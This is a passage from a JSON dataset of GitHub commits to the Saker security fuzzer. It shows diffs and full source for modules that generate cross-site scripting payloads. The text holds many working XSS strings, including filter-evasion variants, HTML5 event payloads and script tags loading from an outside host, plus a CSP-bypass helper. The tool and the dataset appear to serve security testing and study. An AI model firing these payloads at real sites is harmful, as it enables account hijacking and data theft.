                                "    def alterTest(self, p=False):",
                                "    def img(self):"
                            ],
                            "goodparts": [
                                "    @classmethod",
                                "    def alterTest(cls, p=False):",
                                "    @classmethod",
                                "    def genTestHTML(cls):",
                                "        s = ''",
                                "        for t in cls.tags:",
                                "            s += '<%s src=\"x\"' % t",
                                "            for e in cls.events:",
                                "                s += ''' %s=\"console.log('%s %s')\" ''' % (e, t, e)",
                                "            s += '>%s</%s>\\n' % (t, t)",
                                "        return cls.htmlTemplate % s",
                                "    def img(self, payload):"
                            ]
                        }
                    ],
                    "source": "\n from saker.fuzzers.fuzzer import Fuzzer class XSS(Fuzzer): \"\"\"generate XSS payload\"\"\" def __init__(self, url=\"\"): \"\"\" url: xss payload url \"\"\" super(XSS, self).__init__() self.url=url @staticmethod def alterTest(self, p=False): return \"<script>alert(/xss/)</script>\" def img(self): return '<img/onerror=\"%s\"/src=x>' % payload def svg(self, payload): return '<svg/onload=\"%s\"/>' % payload def style(self, payload): return '<style/onload=\"%s\"></style>' % payload def input(self, payload): return '<input/onfocus=\"%s\"/autofocus>' % payload def marquee(self, payload): return '<marquee/onstart=\"%s\"></marquee>' % payload def div(self, payload): return '<div/onwheel=\"%s\"/style=\"height:200%;width:100%\"></div>' % payload def script(self): payload=\"<script src='%s'></script>\" % self.url return payload def event(self, element, src, event, js): payload=\"<%s src=\" % element payload +='\"%s\" ' % src payload +=event payload +=\"=%s >\" % js return payload def cspBypass(self): return \"<link rel='preload' href='%s'>\" % self.url ",
                    "sourceWithComments": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n\nfrom saker.fuzzers.fuzzer import Fuzzer\n\n\nclass XSS(Fuzzer):\n\n    \"\"\"generate XSS payload\"\"\"\n\n    def __init__(self, url=\"\"):\n        \"\"\"\n        url: xss payload url\n        \"\"\"\n        super(XSS, self).__init__()\n        self.url = url\n\n    @staticmethod\n    def alterTest(self, p=False):\n        return \"<script>alert(/xss/)</script>\"\n\n    def img(self):\n        return '<img/onerror=\"%s\"/src=x>' % payload\n\n    def svg(self, payload):\n        return '<svg/onload=\"%s\"/>' % payload\n\n    def style(self, payload):\n        return '<style/onload=\"%s\"></style>' % payload\n\n    def input(self, payload):\n        return '<input/onfocus=\"%s\"/autofocus>' % payload\n\n    def marquee(self, payload):\n        return '<marquee/onstart=\"%s\"></marquee>' % payload\n\n    def div(self, payload):\n        return '<div/onwheel=\"%s\"/style=\"height:200%;width:100%\"></div>' % payload\n\n    def script(self):\n        payload = \"<script src='%s'></script>\" % self.url\n        return payload\n\n    def event(self, element, src, event, js):\n        payload = \"<%s src=\" % element\n        payload += '\"%s\" ' % src\n        payload += event\n        payload += \"=%s >\" % js\n        return payload\n\n    def cspBypass(self):\n        return \"<link rel='preload' href='%s'>\" % self.url\n"
                }
            },
            "msg": "update xss fuzz"
        },
        "41edd3db5be87f860c0c37199de9b55596b704da": {
            "url": "https://api.github.com/repos/LyleMi/Saker/commits/41edd3db5be87f860c0c37199de9b55596b704da",
            "html_url": "https://github.com/LyleMi/Saker/commit/41edd3db5be87f860c0c37199de9b55596b704da",
            "sha": "41edd3db5be87f860c0c37199de9b55596b704da",
            "keyword": "XSS update",
            "diff": "diff --git a/saker/fuzzers/code.py b/saker/fuzzers/code.py\nindex 4408d99..2acf92f 100644\n--- a/saker/fuzzers/code.py\n+++ b/saker/fuzzers/code.py\n@@ -3,7 +3,8 @@\n \n import random\n import string\n-from urllib import quote\n+from urllib.parse import quote\n+from unicodedata import normalize\n from saker.fuzzers.fuzzer import Fuzzer\n \n \n@@ -70,3 +71,16 @@ def urlencode(s, force=False):\n             s = map(lambda i: hex(ord(i)).replace(\"0x\", \"%\"), s)\n             s = \"\".join(s)\n         return s\n+\n+    @staticmethod\n+    def findUpper(dst):\n+        return list(filter(lambda i: i.upper() == dst, map(chr, range(1, 0x10000))))\n+\n+    @staticmethod\n+    def findLower(dst):\n+        return list(filter(lambda i: i.lower() == dst, map(chr, range(1, 0x10000))))\n+\n+    @staticmethod\n+    def findNormalize(dst, form='NFKC'):\n+        # form should in ['NFC', 'NFKC', 'NFD', 'NFKD']\n+        return list(filter(lambda i: normalize(form, i)[0] == dst, map(chr, range(1, 0x10000))))\ndiff --git a/saker/fuzzers/xss.py b/saker/fuzzers/xss.py\nindex 9a01ff5..fbcdae9 100644\n--- a/saker/fuzzers/xss.py\n+++ b/saker/fuzzers/xss.py\n@@ -280,6 +280,8 @@\n \n # xss payloads\n _payloads = [\n+    '<q/oncut=open()>',\n+    '<svg/onload=eval(name)>',\n     '<img src=x onerror=alert(/xss/)>',\n     \"\"\"<img src=\"javascript:alert('xss');\">\"\"\",\n     \"\"\"<style>@im\\\\port'\\\\ja\\\\vasc\\\\ript:alert(\"xss\")';</style>\"\"\",\n",
            "message": "",
            "files": {
                "/saker/fuzzers/code.py": {
                    "changes": [
                        {
                            "diff": "\n \n import random\n import string\n-from urllib import quote\n+from urllib.parse import quote\n+from unicodedata import normalize\n from saker.fuzzers.fuzzer import Fuzzer\n \n \n",
                            "add": 2,
                            "remove": 1,
                            "filename": "/saker/fuzzers/code.py",
                            "badparts": [
                                "from urllib import quote"
                            ],
                            "goodparts": [
                                "from urllib.parse import quote",
                                "from unicodedata import normalize"
                            ]
                        }
                    ],
                    "source": "\n import random import string from urllib import quote from saker.fuzzers.fuzzer import Fuzzer class Code(Fuzzer): \"\"\"Code Payload\"\"\" homograph={ 'a': '\\u0430', 'c': '\\u03F2', 'd': '\\u0501', 'e': '\\u0435', 'h': '\\u04BB', 'i': '\\u0456', 'j': '\\u0458', 'l': '\\u04CF', 'o': '\\u043E', 'p': '\\u0440', 'r': '\\u0433', 'q': '\\u051B', 's': '\\u0455', 'w': '\\u051D', 'x': '\\u0445', 'y': '\\u0443', } def __init__(self): super(Code, self).__init__() @staticmethod def fuzzAscii(): for i in xrange(256): yield chr(i) @staticmethod def fuzzUnicode(cnt=1): for i in xrange(cnt): yield unichr(random.randint(0, 0xffff)) @staticmethod def fuzzUnicodeReplace(s, cnt=1): s=s.replace(\"A\", \"\u0100\", cnt) s=s.replace(\"A\", \"\u0102\", cnt) s=s.replace(\"A\", \"\u0104\", cnt) s=s.replace(\"a\", \"\u03b1\", cnt) s=s.replace(\"e\", \"\u0435\", cnt) s=s.replace(\"a\", \"\u0430\", cnt) s=s.replace(\"e\", \"\u0451\", cnt) s=s.replace(\"o\", \"\u043e\", cnt) return s @staticmethod def fuzzErrorUnicode(s): return s +chr(random.randint(0xC2, 0xef)) @staticmethod def urlencode(s, force=False): if not force: s=quote(s) else: s=map(lambda i: hex(ord(i)).replace(\"0x\", \"%\"), s) s=\"\".join(s) return s ",
                    "sourceWithComments": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n\nimport random\nimport string\nfrom urllib import quote\nfrom saker.fuzzers.fuzzer import Fuzzer\n\n\nclass Code(Fuzzer):\n\n    \"\"\"Code Payload\"\"\"\n\n    homograph = {\n        'a': '\\u0430',\n        'c': '\\u03F2',\n        'd': '\\u0501',\n        'e': '\\u0435',\n        'h': '\\u04BB',\n        'i': '\\u0456',\n        'j': '\\u0458',\n        'l': '\\u04CF',\n        'o': '\\u043E',\n        'p': '\\u0440',\n        'r': '\\u0433',\n        'q': '\\u051B',\n        's': '\\u0455',\n        'w': '\\u051D',\n        'x': '\\u0445',\n        'y': '\\u0443',\n    }\n\n    def __init__(self):\n        super(Code, self).__init__()\n\n    @staticmethod\n    def fuzzAscii():\n        for i in xrange(256):\n            yield chr(i)\n\n    @staticmethod\n    def fuzzUnicode(cnt=1):\n        for i in xrange(cnt):\n            yield unichr(random.randint(0, 0xffff))\n\n    @staticmethod\n    def fuzzUnicodeReplace(s, cnt=1):\n        # Greek letter\n        s = s.replace(\"A\", \"\u0100\", cnt)\n        s = s.replace(\"A\", \"\u0102\", cnt)\n        s = s.replace(\"A\", \"\u0104\", cnt)\n        s = s.replace(\"a\", \"\u03b1\", cnt)\n        # Russian letter 1-4\n        s = s.replace(\"e\", \"\u0435\", cnt)\n        s = s.replace(\"a\", \"\u0430\", cnt)\n        s = s.replace(\"e\", \"\u0451\", cnt)\n        s = s.replace(\"o\", \"\u043e\", cnt)\n        return s\n\n    @staticmethod\n    def fuzzErrorUnicode(s):\n        # https://www.leavesongs.com/PENETRATION/mysql-charset-trick.html\n        return s + chr(random.randint(0xC2, 0xef))\n\n    @staticmethod\n    def urlencode(s, force=False):\n        if not force:\n            s = quote(s)\n        else:\n            s = map(lambda i: hex(ord(i)).replace(\"0x\", \"%\"), s)\n            s = \"\".join(s)\n        return s\n"
                }
            },
            "msg": "update code and xss fuzz"
        },
        "9d984e18d74febb18c47c74a2e0ad9fe6efc0478": {
            "url": "https://api.github.com/repos/LyleMi/Saker/commits/9d984e18d74febb18c47c74a2e0ad9fe6efc0478",
            "html_url": "https://github.com/LyleMi/Saker/commit/9d984e18d74febb18c47c74a2e0ad9fe6efc0478",
            "sha": "9d984e18d74febb18c47c74a2e0ad9fe6efc0478",
            "keyword": "XSS update",
            "diff": "diff --git a/saker/fuzzers/xss.py b/saker/fuzzers/xss.py\nindex 4f1511f..235222d 100644\n--- a/saker/fuzzers/xss.py\n+++ b/saker/fuzzers/xss.py\n@@ -282,13 +282,15 @@\n _payloads = [\n     '<q/oncut=open()>',\n     '<svg/onload=eval(name)>',\n+    '<svg/onload=eval(window.name)>',\n+    '<svg/onload=eval(location.hash.slice(1))>',\n     '<img src=x onerror=alert(/xss/)>',\n     \"\"\"<img src=\"javascript:alert('xss');\">\"\"\",\n     \"\"\"<style>@im\\\\port'\\\\ja\\\\vasc\\\\ript:alert(\"xss\")';</style>\"\"\",\n     \"\"\"<img style=\"xss:expr/*xss*/ession(alert('xss'))\"> \"\"\",\n     \"\"\"<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert('xss');\">\"\"\",\n     \"\"\"<meta http-equiv=\"refresh\" content=\"0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\">\"\"\",\n-    \"\"\"<head><meta http-equiv=\"content-type\" content=\"text/html; charset=utf-7\"> </head>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-\"\"\",\n+    \"\"\"<head><meta http-equiv=\"content-type\" content=\"text/html; charset=utf-7\"> </head>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-\"\"\"\n ]\n \n # payload for waf test\n@@ -319,7 +321,9 @@\n     '<a/href=javascript&colon;co\\u006efirm&#40;&quot;1&quot;&#41;>clickme</a>',\n     '<img src=x onerror=confir\\u006d`1`>',\n     '<svg/onload=co\\u006efir\\u006d`1`>',\n-    '<?xml version=\"1.0\"?><html><script xmlns=\"http://www.w3.org/1999/xhtml\">alert(1)</script></html>'\n+    '<?xml version=\"1.0\"?><html><script xmlns=\"http://www.w3.org/1999/xhtml\">alert(1)</script></html>',\n+    '<scriscriptpt>alert(/xss/)</scriscriptpt>',\n+    '\u00bcscript\u00bealert(\u00a2XSS\u00a2)\u00bc/script\u00be'\n ]\n \n # payload with html 5 features\n",
            "message": "",
            "files": {
                "/saker/fuzzers/xss.py": {
                    "changes": [
                        {
                            "diff": "\n _payloads = [\n     '<q/oncut=open()>',\n     '<svg/onload=eval(name)>',\n+    '<svg/onload=eval(window.name)>',\n+    '<svg/onload=eval(location.hash.slice(1))>',\n     '<img src=x onerror=alert(/xss/)>',\n     \"\"\"<img src=\"javascript:alert('xss');\">\"\"\",\n     \"\"\"<style>@im\\\\port'\\\\ja\\\\vasc\\\\ript:alert(\"xss\")';</style>\"\"\",\n     \"\"\"<img style=\"xss:expr/*xss*/ession(alert('xss'))\"> \"\"\",\n     \"\"\"<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert('xss');\">\"\"\",\n     \"\"\"<meta http-equiv=\"refresh\" content=\"0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\">\"\"\",\n-    \"\"\"<head><meta http-equiv=\"content-type\" content=\"text/html; charset=utf-7\"> </head>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-\"\"\",\n+    \"\"\"<head><meta http-equiv=\"content-type\" content=\"text/html; charset=utf-7\"> </head>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-\"\"\"\n ]\n \n # payload for waf test\n",
                            "add": 3,
                            "remove": 1,
                            "filename": "/saker/fuzzers/xss.py",
                            "badparts": [
                                "    \"\"\"<head><meta http-equiv=\"content-type\" content=\"text/html; charset=utf-7\"> </head>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-\"\"\","
                            ],
                            "goodparts": [
                                "    '<svg/onload=eval(window.name)>',",
                                "    '<svg/onload=eval(location.hash.slice(1))>',",
                                "    \"\"\"<head><meta http-equiv=\"content-type\" content=\"text/html; charset=utf-7\"> </head>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-\"\"\""
                            ]
                        }
                    ],
                    "source": "\n from saker.fuzzers.fuzzer import Fuzzer _tags=[ 'a', 'abbr', 'acronym', 'address', 'applet', 'area', 'article', 'aside', 'audio', 'b', 'base', 'basefont', 'bdi', 'bdo', 'bgsound', 'big', 'blink', 'blockquote', 'body', 'br', 'button', 'canvas', 'caption', 'center', 'cite', 'code', 'col', 'colgroup', 'command', 'content', 'data', 'datalist', 'dd', 'del', 'details', 'dfn', 'dialog', 'dir', 'div', 'dl', 'dt', 'element', 'em', 'embed', 'fieldset', 'figcaption', 'figure', 'font', 'footer', 'form', 'frame', 'frameset', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'head', 'header', 'hgroup', 'hr', 'html', 'i', 'iframe', 'image', 'img', 'input', 'ins', 'isindex', 'kbd', 'keygen', 'label', 'layer', 'legend', 'li', 'link', 'listing', 'main', 'map', 'mark', 'marquee', 'menu', 'menuitem', 'meta', 'meter', 'multicol', 'nav', 'nobr', 'noembed', 'noframes', 'nolayer', 'noscript', 'object', 'ol', 'optgroup', 'option', 'output', 'p', 'param', 'picture', 'pre', 'progress', 'q', 'rp', 'rt', 'rtc', 'ruby', 's', 'samp', 'script', 'section', 'select', 'shadow', 'small', 'source', 'spacer', 'span', 'strike', 'strong', 'style', 'sub', 'summary', 'sup', 'table', 'tbody', 'td', 'template', 'textarea', 'tfoot', 'th', 'thead', 'time', 'title', 'tr', 'track', 'tt', 'u', 'ul', 'var', 'video', 'wbr', 'xmp', ] _events=[ 'onabort', 'onautocomplete', 'onautocompleteerror', 'onafterscriptexecute', 'onanimationend', 'onanimationiteration', 'onanimationstart', 'onbeforecopy', 'onbeforecut', 'onbeforeload', 'onbeforepaste', 'onbeforescriptexecute', 'onbeforeunload', 'onbegin', 'onblur', 'oncanplay', 'oncanplaythrough', 'onchange', 'onclick', 'oncontextmenu', 'oncopy', 'oncut', 'ondblclick', 'ondrag', 'ondragend', 'ondragenter', 'ondragleave', 'ondragover', 'ondragstart', 'ondrop', 'ondurationchange', 'onend', 'onemptied', 'onended', 'onerror', 'onfocus', 'onfocusin', 'onfocusout', 'onhashchange', 'oninput', 'oninvalid', 'onkeydown', 'onkeypress', 'onkeyup', 'onload', 'onloadeddata', 'onloadedmetadata', 'onloadstart', 'onmessage', 'onmousedown', 'onmouseenter', 'onmouseleave', 'onmousemove', 'onmouseout', 'onmouseover', 'onmouseup', 'onmousewheel', 'onoffline', 'ononline', 'onorientationchange', 'onpagehide', 'onpageshow', 'onpaste', 'onpause', 'onplay', 'onplaying', 'onpopstate', 'onprogress', 'onratechange', 'onreset', 'onresize', 'onscroll', 'onsearch', 'onseeked', 'onseeking', 'onselect', 'onselectionchange', 'onselectstart', 'onstalled', 'onstorage', 'onsubmit', 'onsuspend', 'ontimeupdate', 'ontoggle', 'ontouchcancel', 'ontouchend', 'ontouchmove', 'ontouchstart', 'ontransitionend', 'onunload', 'onvolumechange', 'onwaiting', 'onwebkitanimationend', 'onwebkitanimationiteration', 'onwebkitanimationstart', 'onwebkitfullscreenchange', 'onwebkitfullscreenerror', 'onwebkitkeyadded', 'onwebkitkeyerror', 'onwebkitkeymessage', 'onwebkitneedkey', 'onwebkitsourceclose', 'onwebkitsourceended', 'onwebkitsourceopen', 'onwebkitspeechchange', 'onwebkittransitionend', 'onwheel' ] _htmlTemplate=''' <!DOCTYPE html> <html> <head> <title>XSS Fuzzer</title> <meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" /> </head> <body> %s </body> </html> ''' _probes=[ \"\"\"'';!--\"<XSS>=&{()}\"\"\", ] _payloads=[ '<q/oncut=open()>', '<svg/onload=eval(name)>', '<img src=x onerror=alert(/xss/)>', \"\"\"<img src=\"javascript:alert('xss');\">\"\"\", \"\"\"<style>@im\\\\port'\\\\ja\\\\vasc\\\\ript:alert(\"xss\")';</style>\"\"\", \"\"\"<img style=\"xss:expr/*xss*/ession(alert('xss'))\"> \"\"\", \"\"\"<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert('xss');\">\"\"\", \"\"\"<meta http-equiv=\"refresh\" content=\"0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\">\"\"\", \"\"\"<head><meta http-equiv=\"content-type\" content=\"text/html; charset=utf-7\"> </head>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-\"\"\", ] _waf_payloads=[ \"<IMG SRC=JaVaScRiPt:alert('xss')>\", '<<script>alert(\"xss\");//<</script>', \"\"\"<img src=\"javascript:alert('xss')\" \"\"\", '<a href=\"javascript%26colon;alert(1)\">click', '<a href=javas& '<--`<img/src=` onerror=confirm``> --!>', '\\'\"</Script><Html Onmouseover=(confirm)()//' '<imG/sRc=l oNerrOr=(prompt)() x>', '<!--<iMg sRc=--><img src=x oNERror=(prompt)`` x>', '<deTails open oNToggle=confi\\u0072m()>', '<img sRc=l oNerrOr=(confirm)() x>', '<svg/x=\">\"/onload=confirm()//', '<svg%0Aonload=%09((pro\\u006dpt))()//', '<iMg sRc=x:confirm`` oNlOad=e\\u0076al(src)>', '<sCript x>confirm``</scRipt x>', '<Script x>prompt()</scRiPt x>', '<sCriPt sRc=//t.cn>', '<embed//sRc=//t.cn>', '<base href=//t.cn/><script src=/>', '<object//data=//t.cn>', '<s=\" onclick=confirm``>clickme', '<svG oNLoad=co\\u006efirm& '\\'\"><y///oNMousEDown=((confirm))()>Click', '<a/href=javascript&colon;co\\u006efirm& '<img src=x onerror=confir\\u006d`1`>', '<svg/onload=co\\u006efir\\u006d`1`>', '<?xml version=\"1.0\"?><html><script xmlns=\"http://www.w3.org/1999/xhtml\">alert(1)</script></html>' ] _h5payloads=[ '<form id=\"test\"></form><button form=\"test\" formaction=\"javascript:alert(1)\">X</button>', '<input onfocus=alert(1) autofocus>', '<input onblur=alert(1) autofocus><input autofocus>', '<body onscroll=alert(1)>' +'<br>' * 100 +'<input autofocus>', '<video><source onerror=\"alert(1)\">', '<video onerror=\"alert(1)\"><source></source></video>', '<form><button formaction=\"javascript:alert(1)\">X</button>', '<math href=\"javascript:alert(1)\">CLICKME</math>', '<link rel=\"import\" href=\"test.svg\" />', '<iframe srcdoc=\"&lt;img src&equals;x:x onerror&equals;alert&lpar;1&rpar;&gt;\" />', ] class XSS(Fuzzer): \"\"\"generate XSS payload\"\"\" tags=_tags events=_events htmlTemplate=_htmlTemplate probes=_probes payloads=_payloads waf_payloads=_waf_payloads h5payloads=_h5payloads def __init__(self, url=\"\"): \"\"\" url: xss payload url \"\"\" super(XSS, self).__init__() self.url=url @classmethod def alterTest(cls, p=False): return \"<script>alert(/xss/)</script>\" @classmethod def genTestHTML(cls): s='' for t in cls.tags: s +='<%s src=\"x\"' % t for e in cls.events: s +=''' %s=\"console.log('%s %s')\" ''' %(e, t, e) s +='>%s</%s>\\n' %(t, t) return cls.htmlTemplate % s @classmethod def acmehttp01(cls, url): return url +'/.well-known/acme-challenge/?<h1>hi' def img(self, payload): return '<img/onerror=\"%s\"/src=x>' % payload def svg(self, payload): return '<svg/onload=\"%s\"/>' % payload def style(self, payload): return '<style/onload=\"%s\"></style>' % payload def input(self, payload): return '<input/onfocus=\"%s\"/autofocus>' % payload def marquee(self, payload): return '<marquee/onstart=\"%s\"></marquee>' % payload def div(self, payload): return '<div/onwheel=\"%s\"/style=\"height:200%;width:100%\"></div>' % payload def script(self): payload=\"<script src='%s'></script>\" % self.url return payload def event(self, element, src, event, js): payload=\"<%s src=\" % element payload +='\"%s\" ' % src payload +=event payload +=\"=%s >\" % js return payload def cspBypass(self): return \"<link rel='preload' href='%s'>\" % self.url ",
                    "sourceWithComments": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n\nfrom saker.fuzzers.fuzzer import Fuzzer\n\n_tags = [\n    'a',\n    'abbr',\n    'acronym',\n    'address',\n    'applet',\n    'area',\n    'article',\n    'aside',\n    'audio',\n    'b',\n    'base',\n    'basefont',\n    'bdi',\n    'bdo',\n    'bgsound',\n    'big',\n    'blink',\n    'blockquote',\n    'body',\n    'br',\n    'button',\n    'canvas',\n    'caption',\n    'center',\n    'cite',\n    'code',\n    'col',\n    'colgroup',\n    'command',\n    'content',\n    'data',\n    'datalist',\n    'dd',\n    'del',\n    'details',\n    'dfn',\n    'dialog',\n    'dir',\n    'div',\n    'dl',\n    'dt',\n    'element',\n    'em',\n    'embed',\n    'fieldset',\n    'figcaption',\n    'figure',\n    'font',\n    'footer',\n    'form',\n    'frame',\n    'frameset',\n    'h1',\n    'h2',\n    'h3',\n    'h4',\n    'h5',\n    'h6',\n    'head',\n    'header',\n    'hgroup',\n    'hr',\n    'html',\n    'i',\n    'iframe',\n    'image',\n    'img',\n    'input',\n    'ins',\n    'isindex',\n    'kbd',\n    'keygen',\n    'label',\n    'layer',\n    'legend',\n    'li',\n    'link',\n    'listing',\n    'main',\n    'map',\n    'mark',\n    'marquee',\n    'menu',\n    'menuitem',\n    'meta',\n    'meter',\n    'multicol',\n    'nav',\n    'nobr',\n    'noembed',\n    'noframes',\n    'nolayer',\n    'noscript',\n    'object',\n    'ol',\n    'optgroup',\n    'option',\n    'output',\n    'p',\n    'param',\n    'picture',\n    # 'plaintext',\n    'pre',\n    'progress',\n    'q',\n    'rp',\n    'rt',\n    'rtc',\n    'ruby',\n    's',\n    'samp',\n    'script',\n    'section',\n    'select',\n    'shadow',\n    'small',\n    'source',\n    'spacer',\n    'span',\n    'strike',\n    'strong',\n    'style',\n    'sub',\n    'summary',\n    'sup',\n    'table',\n    'tbody',\n    'td',\n    'template',\n    'textarea',\n    'tfoot',\n    'th',\n    'thead',\n    'time',\n    'title',\n    'tr',\n    'track',\n    'tt',\n    'u',\n    'ul',\n    'var',\n    'video',\n    'wbr',\n    'xmp',\n]\n\n_events = [\n    'onabort',\n    'onautocomplete',\n    'onautocompleteerror',\n    'onafterscriptexecute',\n    'onanimationend',\n    'onanimationiteration',\n    'onanimationstart',\n    'onbeforecopy',\n    'onbeforecut',\n    'onbeforeload',\n    'onbeforepaste',\n    'onbeforescriptexecute',\n    'onbeforeunload',\n    'onbegin',\n    'onblur',\n    'oncanplay',\n    'oncanplaythrough',\n    'onchange',\n    'onclick',\n    'oncontextmenu',\n    'oncopy',\n    'oncut',\n    'ondblclick',\n    'ondrag',\n    'ondragend',\n    'ondragenter',\n    'ondragleave',\n    'ondragover',\n    'ondragstart',\n    'ondrop',\n    'ondurationchange',\n    'onend',\n    'onemptied',\n    'onended',\n    'onerror',\n    'onfocus',\n    'onfocusin',\n    'onfocusout',\n    'onhashchange',\n    'oninput',\n    'oninvalid',\n    'onkeydown',\n    'onkeypress',\n    'onkeyup',\n    'onload',\n    'onloadeddata',\n    'onloadedmetadata',\n    'onloadstart',\n    'onmessage',\n    'onmousedown',\n    'onmouseenter',\n    'onmouseleave',\n    'onmousemove',\n    'onmouseout',\n    'onmouseover',\n    'onmouseup',\n    'onmousewheel',\n    'onoffline',\n    'ononline',\n    'onorientationchange',\n    'onpagehide',\n    'onpageshow',\n    'onpaste',\n    'onpause',\n    'onplay',\n    'onplaying',\n    'onpopstate',\n    'onprogress',\n    'onratechange',\n    'onreset',\n    'onresize',\n    'onscroll',\n    'onsearch',\n    'onseeked',\n    'onseeking',\n    'onselect',\n    'onselectionchange',\n    'onselectstart',\n    'onstalled',\n    'onstorage',\n    'onsubmit',\n    'onsuspend',\n    'ontimeupdate',\n    'ontoggle',\n    'ontouchcancel',\n    'ontouchend',\n    'ontouchmove',\n    'ontouchstart',\n    'ontransitionend',\n    'onunload',\n    'onvolumechange',\n    'onwaiting',\n    'onwebkitanimationend',\n    'onwebkitanimationiteration',\n    'onwebkitanimationstart',\n    'onwebkitfullscreenchange',\n    'onwebkitfullscreenerror',\n    'onwebkitkeyadded',\n    'onwebkitkeyerror',\n    'onwebkitkeymessage',\n    'onwebkitneedkey',\n    'onwebkitsourceclose',\n    'onwebkitsourceended',\n    'onwebkitsourceopen',\n    'onwebkitspeechchange',\n    'onwebkittransitionend',\n    'onwheel'\n]\n\n_htmlTemplate = '''\n<!DOCTYPE html>\n<html>\n<head>\n    <title>XSS Fuzzer</title>\n    <meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" />\n</head>\n<body>\n%s\n</body>\n</html>\n'''\n\n# probe for test xss vuln\n_probes = [\n    \"\"\"'';!--\"<XSS>=&{()}\"\"\",\n]\n\n# xss payloads\n_payloads = [\n    '<q/oncut=open()>',\n    '<svg/onload=eval(name)>',\n    '<img src=x onerror=alert(/xss/)>',\n    \"\"\"<img src=\"javascript:alert('xss');\">\"\"\",\n    \"\"\"<style>@im\\\\port'\\\\ja\\\\vasc\\\\ript:alert(\"xss\")';</style>\"\"\",\n    \"\"\"<img style=\"xss:expr/*xss*/ession(alert('xss'))\"> \"\"\",\n    \"\"\"<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert('xss');\">\"\"\",\n    \"\"\"<meta http-equiv=\"refresh\" content=\"0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\">\"\"\",\n    \"\"\"<head><meta http-equiv=\"content-type\" content=\"text/html; charset=utf-7\"> </head>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-\"\"\",\n]\n\n# payload for waf test\n_waf_payloads = [\n    \"<IMG SRC=JaVaScRiPt:alert('xss')>\",\n    '<<script>alert(\"xss\");//<</script>',\n    \"\"\"<img src=\"javascript:alert('xss')\" \"\"\",\n    '<a href=\"javascript%26colon;alert(1)\">click',\n    '<a href=javas&#99;ript:alert(1)>click',\n    '<--`<img/src=` onerror=confirm``> --!>',\n    '\\'\"</Script><Html Onmouseover=(confirm)()//'\n    '<imG/sRc=l oNerrOr=(prompt)() x>',\n    '<!--<iMg sRc=--><img src=x oNERror=(prompt)`` x>',\n    '<deTails open oNToggle=confi\\u0072m()>',\n    '<img sRc=l oNerrOr=(confirm)() x>',\n    '<svg/x=\">\"/onload=confirm()//',\n    '<svg%0Aonload=%09((pro\\u006dpt))()//',\n    '<iMg sRc=x:confirm`` oNlOad=e\\u0076al(src)>',\n    '<sCript x>confirm``</scRipt x>',\n    '<Script x>prompt()</scRiPt x>',\n    '<sCriPt sRc=//t.cn>',\n    '<embed//sRc=//t.cn>',\n    '<base href=//t.cn/><script src=/>',\n    '<object//data=//t.cn>',\n    '<s=\" onclick=confirm``>clickme',\n    '<svG oNLoad=co\\u006efirm&#x28;1&#x29>',\n    '\\'\"><y///oNMousEDown=((confirm))()>Click',\n    '<a/href=javascript&colon;co\\u006efirm&#40;&quot;1&quot;&#41;>clickme</a>',\n    '<img src=x onerror=confir\\u006d`1`>',\n    '<svg/onload=co\\u006efir\\u006d`1`>',\n    '<?xml version=\"1.0\"?><html><script xmlns=\"http://www.w3.org/1999/xhtml\">alert(1)</script></html>'\n]\n\n# payload with html 5 features\n# http://html5sec.org\n_h5payloads = [\n    '<form id=\"test\"></form><button form=\"test\" formaction=\"javascript:alert(1)\">X</button>',\n    '<input onfocus=alert(1) autofocus>',\n    '<input onblur=alert(1) autofocus><input autofocus>',\n    '<body onscroll=alert(1)>' + '<br>' * 100 + '<input autofocus>',\n    '<video><source onerror=\"alert(1)\">',\n    '<video onerror=\"alert(1)\"><source></source></video>',\n    '<form><button formaction=\"javascript:alert(1)\">X</button>',\n    '<math href=\"javascript:alert(1)\">CLICKME</math>',\n    '<link rel=\"import\" href=\"test.svg\" />',\n    '<iframe srcdoc=\"&lt;img src&equals;x:x onerror&equals;alert&lpar;1&rpar;&gt;\" />',\n]\n\n\nclass XSS(Fuzzer):\n\n    \"\"\"generate XSS payload\"\"\"\n\n    tags = _tags\n    events = _events\n    htmlTemplate = _htmlTemplate\n    probes = _probes\n    payloads = _payloads\n    waf_payloads = _waf_payloads\n    h5payloads = _h5payloads\n\n    def __init__(self, url=\"\"):\n        \"\"\"\n        url: xss payload url\n        \"\"\"\n        super(XSS, self).__init__()\n        self.url = url\n\n    @classmethod\n    def alterTest(cls, p=False):\n        return \"<script>alert(/xss/)</script>\"\n\n    @classmethod\n    def genTestHTML(cls):\n        s = ''\n        for t in cls.tags:\n            s += '<%s src=\"x\"' % t\n            for e in cls.events:\n                s += ''' %s=\"console.log('%s %s')\" ''' % (e, t, e)\n            s += '>%s</%s>\\n' % (t, t)\n        return cls.htmlTemplate % s\n\n    @classmethod\n    def acmehttp01(cls, url):\n        # https://labs.detectify.com/2018/09/04/xss-using-quirky-implementations-of-acme-http-01/\n        return url + '/.well-known/acme-challenge/?<h1>hi'\n\n    def img(self, payload):\n        return '<img/onerror=\"%s\"/src=x>' % payload\n\n    def svg(self, payload):\n        return '<svg/onload=\"%s\"/>' % payload\n\n    def style(self, payload):\n        return 